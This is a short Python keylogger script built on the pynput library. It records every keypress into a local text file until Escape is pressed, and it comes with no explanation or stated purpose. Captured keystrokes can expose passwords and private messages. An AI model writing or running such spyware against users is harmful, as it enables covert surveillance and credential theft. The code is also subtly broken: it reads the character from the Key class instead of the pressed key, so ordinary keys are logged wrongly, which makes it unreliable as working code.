from pynput.keyboard import Key, Listener

log_file = "key_log.txt"

def on_press(key):
    with open(log_file, "a") as log:
        try:
            log.write(f"{Key.char}")
        except AttributeError:
            if key == Key.space:
                log.write(" ")
            elif key == Key.enter:
                log.write("\n")
            else:
                log.write(f" {key} ")

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()